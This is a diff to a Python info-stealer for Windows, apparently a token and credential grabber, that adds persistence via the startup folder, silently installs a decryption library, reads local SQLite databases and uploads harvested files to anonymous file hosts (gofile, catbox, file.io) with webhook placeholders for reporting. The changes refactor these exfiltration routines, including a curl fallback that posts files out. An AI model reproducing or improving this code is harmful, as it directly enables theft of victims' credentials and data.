@@ -4,7 +4,7 @@ import winreg
 from urllib.parse import urlparse
 from os.path import isfile, exists
 from shutil import copy
-import sqlite3 
+import sqlite3
 from base64 import b64decode
 import winreg
 import zipfile
@@ -16,6 +16,7 @@ from ctypes import *
 from json import loads, dumps, load, dump
 from pathlib import Path
 from locale import windows_locale
+from importlib import import_module
 
 webhook = '%Webhook%'
 FakeWebhook = '%FakeWebhook%'
@@ -33,7 +34,6 @@ biotext = '%Text%'
 
 # WEBSITE UPLOAD 
 
-Anonymousfile = '%AnonymousYesOrNo%'
 Gofile = '%GoFileYesOrNo%'
 fileio = '%FileIOYesOrNo%'
 catbox = '%CatBoxMoeYesOrNo%'
@@ -44,25 +44,17 @@ else:
     StartupMessage = 'Error while adding Trap into the startup folder' 
 requirements = [
     ["requests", "requests"],
-    ["Crypto.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodomex']
+    ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodomex']
 ]
+
 for module in requirements:
     try: 
-        __import__(module[0])
+        import_module(module[0])
     except:
         subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True)
         time.sleep(3)
 
 from Cryptodome.Cipher import AES
-
-
-for modl in requirements:
-    try: __import__(modl[0])
-    except:
-        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
-        time.sleep(3)
-
-
 import requests
 def sql_connect(database_path):
     conn = sqlite3.connect(database_path)
@@ -1271,37 +1263,29 @@ def uploadTokq(Tokq, path):
 
 def gofileupload(path):
     try:
-        return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
+        data = requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
+        return data
     except:
         try:
-            try:gofileserver = loads(urlopen("https://api.gofile.io/getServer").read().decode('utf-8'))["data"]["server"]
-            except:gofileserver = "store4"
+            try:
+                gofileserver = loads(urlopen("https://api.gofile.io/getServer").read().decode('utf-8'))["data"]["server"]
+            except:
+                gofileserver = "store4"
             r = subprocess.Popen(f"curl -F \"file=@{path}\" https://{gofileserver}.gofile.io/uploadFile", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
             return loads(r[0].decode('utf-8'))["data"]["downloadPage"]
-        except:return False
-    
-    
-def anonymfileupload(path):
-    try:
-        with open(path, 'rb') as file:
-            response = requests.post('https://anonymfile.com/api/v1/upload', files={'file': file})
-        
-        result_json = response.json()
-        
-        if response.status_code == 200 and result_json.get("status") is True:
-            file_url = result_json["data"]["file"]["url"]["full"]
-            return file_url
-        else:
-            error_message = result_json.get("errors", {}).get("file", ["Unknown error"])
+        except:
             return False
-    except Exception as e:
-        return False
 
-def catboxmoeupload(path):
+def catboxmoeupload(path, request_type='upload'):
     try:
         with open(path, 'rb') as file:
-            response = requests.post('https://catbox.moe/user/api.php', files={'file': file})
-        return response.text.strip()
+            data = {
+    'reqtype': 'fileupload',
+    'userhash': '',
+}
+            files = {'fileToUpload': (file.name, file, 'application/octet-stream')}
+            response = requests.post(f'https://catbox.moe/user/api.php?request_type={request_type}', files=files, data=data)
+            return response.content.decode()
     except Exception as e:
         return False
 
@@ -1310,14 +1294,13 @@ def fileioupload(path):
     try:
         with open(path, 'rb') as file:
             response = requests.post('https://file.io/', files={'file': file})
+            print(response.json())
         return response.json()["link"]
     except Exception as e:
         return False
 
 def upload_file(path):
-    if Anonymousfile == True:
-        anonymfileupload(path)
-    elif fileio == True:
+    if fileio == True:
         fileioupload(path)
     elif Gofile == True:
         gofileupload(path)
